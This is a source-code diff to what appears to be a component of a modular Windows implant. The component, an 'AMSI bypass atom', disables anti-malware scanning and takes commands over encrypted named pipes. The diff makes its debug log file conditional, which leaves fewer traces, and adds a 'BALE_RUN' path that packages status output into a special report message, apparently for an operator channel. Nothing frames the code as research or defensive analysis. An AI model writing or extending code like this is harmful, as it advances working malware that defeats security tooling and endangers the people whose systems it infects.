@@ -16,6 +16,7 @@ extern BOOL InstallAMSIBypass(void);
 
 /* Debug logging to C:\Users\Public\amsi_debug.txt */
 static void AmsiDebug(const char *format, ...) {
+  if (!Config::LOGGING_ENABLED) return;
   char buf[512];
   va_list args;
   va_start(args, format);
@@ -99,8 +100,27 @@ DWORD WINAPI AMSIBypassAtomMain(LPVOID lpParam) {
       IPC_MESSAGE inMsg = {0};
       if (IPC_ReceiveMessage(hCmdPipe, &inMsg, SharedSessionKey, 16)) {
         if (inMsg.CommandId == CMD_EXECUTE) {
-          AmsiDebug("Received CMD_EXECUTE. Re-sending status.");
-          IPC_SendMessage(hReportPipe, &outMsg, SharedSessionKey, 16);
+          std::string cmd((char*)inMsg.Payload, inMsg.dwPayloadLen);
+          BOOL bIsBale = (cmd == "BALE_RUN");
+          AmsiDebug("Received CMD_EXECUTE (%s). Re-sending status.", cmd.c_str());
+          
+          if (bIsBale) {
+            // Send via CMD_BALE_REPORT with text type header
+            struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
+            hdr.dwType = 0; // Text
+            hdr.dwFlags = 0;
+            hdr.dwPayloadLen = outMsg.dwPayloadLen;
+            IPC_MESSAGE baleMsg = {0};
+            baleMsg.dwSignature = 0x534D4952;
+            baleMsg.CommandId = CMD_BALE_REPORT;
+            baleMsg.AtomId = 4;
+            baleMsg.dwPayloadLen = sizeof(hdr) + outMsg.dwPayloadLen;
+            memcpy(baleMsg.Payload, &hdr, sizeof(hdr));
+            memcpy(baleMsg.Payload + sizeof(hdr), outMsg.Payload, outMsg.dwPayloadLen);
+            IPC_SendMessage(hReportPipe, &baleMsg, SharedSessionKey, 16);
+          } else {
+            IPC_SendMessage(hReportPipe, &outMsg, SharedSessionKey, 16);
+          }
         } else if (inMsg.CommandId == CMD_TERMINATE) {
           AmsiDebug("Received CMD_TERMINATE. Exiting.");
           break;
